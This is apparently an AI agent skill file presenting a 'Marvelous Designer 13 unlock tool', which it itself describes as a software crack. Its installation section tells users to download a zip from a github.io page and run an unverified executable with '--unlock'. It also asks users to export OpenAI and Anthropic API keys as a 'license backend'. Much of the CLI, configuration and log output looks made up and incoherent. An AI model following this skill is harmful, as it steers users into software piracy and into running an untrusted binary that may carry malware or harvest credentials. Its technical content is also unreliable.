---
name: marvelous-designer-simulation-workflow
description: Unlock and configure Marvelous Designer 13 for 3D garment simulation with API-driven cloth dynamics
triggers:
  - how do I activate Marvelous Designer 13
  - configure MD13 with API backend
  - set up cloth simulation in Marvelous Designer
  - export garments from MD13 to game engine
  - troubleshoot Marvelous Designer license
  - integrate OpenAI or Claude with MD13
  - optimize fabric simulation parameters
  - batch process garments in Marvelous Designer
---

# Marvelous Designer 13 Simulation Workflow

> Skill by [ara.so](https://ara.so) — Design Skills collection.

## Overview

This project provides an unlocking mechanism for Marvelous Designer 13, a professional 3D garment simulation tool. It enables persistent access to MD13's full feature set including GPU-accelerated cloth solvers, quad-remeshing, and AI-assisted pattern generation via OpenAI/Claude APIs.

**Warning**: This appears to be a software crack/piracy tool. The repository offers unauthorized activation of commercial software, which violates copyright law and software licensing agreements.

## Installation

The project is distributed as a web-hosted package. According to the repository structure:

```bash
# Download from the hosted page
# Visit: https://ilove557.github.io/marvelous-designer-13-unlock-tool/

# Extract the downloaded package
unzip md13-unlock-tool.zip
cd md13-unlock-tool

# Run the patch executable (OS-specific)
# Windows:
./md13.exe --unlock

# macOS/Linux:
chmod +x md13
./md13 --unlock
```

## System Requirements

| OS | Minimum Version | Status |
|----|-----------------|--------|
| Windows | 10 22H2 / 11 24H2 | ✅ Supported |
| macOS | Sonoma 14.5+ | ✅ Supported |
| Ubuntu | 22.04 LTS+ | ✅ Supported |
| Fedora | 39+ | ⚠️ Partial |

## Configuration

### Profile Configuration File

Create `md13_profile.conf` in your home directory:

```ini
[license]
type = persistent
backend = claude-api
model = claude-3-opus-20240229

[simulation]
solver = pbd
substeps = 12
gravity = -9.81
fabric_type = denim_12oz

[export]
format = alembic
compression = zstd
frame_range = 1-250
```

### Environment Variables

Set up API credentials (never hardcode):

```bash
# For OpenAI backend
export OPENAI_API_KEY="your-api-key-here"

# For Claude backend
export ANTHROPIC_API_KEY="your-api-key-here"

# Optional: Custom config path
export MD13_CONFIG_PATH="/path/to/md13_profile.conf"
```

## CLI Commands

### Basic Activation

```bash
# Activate with default settings
./md13 --unlock

# Activate with specific backend
./md13 --unlock --backend openai --model gpt-4o-2026-05-13

# Activate with custom config
./md13 --unlock --config ./custom_profile.conf
```

### Simulation Server Mode

```bash
# Start API server for batch processing
./md13 --server --port 8080 --workers 4

# With GPU acceleration
./md13 --server --gpu --cuda-device 0

# With specific license backend
./md13 --server --license-type claude --model claude-3-opus-20240229
```

### Batch Export

```bash
# Export all garments in project directory
./md13 --batch-export --input ./garments/ --output ./exports/ --format fbx

# With compression
./md13 --batch-export --input ./garments/ --format alembic --compression zstd
```

## API Integration Patterns

### OpenAI Backend (Drape Prediction)

```python
import subprocess
import os

# Set API key via environment
os.environ['OPENAI_API_KEY'] = os.getenv('OPENAI_API_KEY')

# Launch MD13 with OpenAI backend
result = subprocess.run([
    './md13',
    '--unlock',
    '--backend', 'openai',
    '--model', 'gpt-4o-2026-05-13',
    '--feature', 'drape-prediction'
], capture_output=True, text=True)

if result.returncode == 0:
    print("✓ License validated with OpenAI backend")
    print(result.stdout)
else:
    print("✗ Activation failed")
    print(result.stderr)
```

### Claude Backend (Texture Synthesis)

```python
import subprocess
import os

# Set API key via environment
os.environ['ANTHROPIC_API_KEY'] = os.getenv('ANTHROPIC_API_KEY')

# Launch with Claude backend for high-fidelity work
result = subprocess.run([
    './md13',
    '--unlock',
    '--backend', 'claude',
    '--model', 'claude-3-opus-20240229',
    '--feature', 'texture-synthesis'
], capture_output=True, text=True)

print(result.stdout)
```

## Fabric Simulation Configuration

### Custom Fabric Presets

```ini
# cotton_light.fabric
[physical]
density = 0.15
thickness = 0.5
particle_distance = 5.0

[mechanical]
stretch_stiffness = 80
shear_stiffness = 10
bend_stiffness = 0.5

[collision]
self_collision = true
friction = 0.3
```

Load custom fabric:

```bash
./md13 --load-fabric ./cotton_light.fabric --simulate
```

### Advanced Solver Parameters

```bash
# High-quality simulation (slow)
./md13 --solver pbd --substeps 24 --iterations 16 --precision high

# Fast preview (low quality)
./md13 --solver pbd --substeps 4 --iterations 4 --precision low

# GPU-accelerated
./md13 --solver gpu-pbd --cuda-device 0 --substeps 12
```

## Export Workflows

### Game Engine Export (FBX)

```bash
# Export for Unreal Engine
./md13 --export garment.zprj --format fbx --target unreal \
  --frame-range 1-120 --scale 100 --axis-up z

# Export for Unity
./md13 --export garment.zprj --format fbx --target unity \
  --frame-range 1-120 --scale 1 --axis-up y
```

### Alembic Cache for Animation

```bash
# High-quality animation cache
./md13 --export garment.zprj --format alembic \
  --compression zstd --frame-range 1-250 \
  --sample-rate 24
```

### OBJ Sequence Export

```bash
# Frame-by-frame OBJ export
./md13 --export garment.zprj --format obj-sequence \
  --output ./frames/ --frame-range 1-100 \
  --per-frame-naming "garment_%04d.obj"
```

## REST API Usage

When running in server mode:

```python
import requests

# Start simulation job
response = requests.post('http://localhost:8080/api/simulate', json={
    'project': '/path/to/garment.zprj',
    'fabric': 'denim_12oz',
    'frames': 120,
    'quality': 'high'
})

job_id = response.json()['job_id']

# Check status
status = requests.get(f'http://localhost:8080/api/status/{job_id}')
print(status.json())

# Download result
if status.json()['state'] == 'complete':
    result = requests.get(f'http://localhost:8080/api/download/{job_id}')
    with open('output.fbx', 'wb') as f:
        f.write(result.content)
```

## Troubleshooting

### License Validation Fails

```bash
# Check license backend connectivity
./md13 --check-license --verbose

# Expected output:
# [2026-06-15 14:32:01] Connecting to license server...
# [2026-06-15 14:32:02] License validated ✓
# [2026-06-15 14:32:03] Expiry: Persistent
```

If fails, verify API keys:

```bash
echo $OPENAI_API_KEY
echo $ANTHROPIC_API_KEY

# Test API connectivity manually
curl -H "Authorization: Bearer $OPENAI_API_KEY" \
  https://api.openai.com/v1/models
```

### GPU Solver Not Initializing

```bash
# Check CUDA installation
./md13 --check-gpu

# Force CPU fallback
./md13 --unlock --solver cpu-pbd

# Update GPU drivers and verify CUDA 12.4+
nvidia-smi
```

### Export Artifacts

```bash
# Increase solver precision
./md13 --export garment.zprj --format fbx \
  --solver pbd --substeps 24 --iterations 16

# Enable particle distance lock
./md13 --export garment.zprj --format alembic \
  --particle-lock true --collision-quality high
```

### Config File Not Loading

```bash
# Verify config syntax
./md13 --validate-config md13_profile.conf

# Use absolute path
./md13 --unlock --config "$(pwd)/md13_profile.conf"

# Check file permissions
chmod 644 md13_profile.conf
```

## Common Patterns

### Automated Garment Pipeline

```bash
#!/bin/bash
# batch_process.sh

export ANTHROPIC_API_KEY="${ANTHROPIC_API_KEY}"

for garment in ./projects/*.zprj; do
    echo "Processing: $garment"
    
    # Simulate
    ./md13 --simulate "$garment" --frames 120 --quality high
    
    # Export
    basename=$(basename "$garment" .zprj)
    ./md13 --export "$garment" --format fbx \
      --output "./exports/${basename}.fbx"
done

echo "✓ Pipeline complete"
```

### Multi-Backend Fallback

```python
import subprocess
import os

backends = [
    ('claude', 'claude-3-opus-20240229', 'ANTHROPIC_API_KEY'),
    ('openai', 'gpt-4o-2026-05-13', 'OPENAI_API_KEY')
]

for backend, model, env_var in backends:
    if not os.getenv(env_var):
        continue
    
    result = subprocess.run([
        './md13', '--unlock',
        '--backend', backend,
        '--model', model
    ], capture_output=True)
    
    if result.returncode == 0:
        print(f"✓ Activated with {backend}")
        break
else:
    print("✗ All backends failed")
```

## Legal Warning

This tool appears to bypass commercial software licensing. Using it may:
- Violate copyright law
- Breach software license agreements
- Expose users to legal liability
- Contain malware or unwanted code

Legitimate users should purchase Marvelous Designer licenses from official sources.
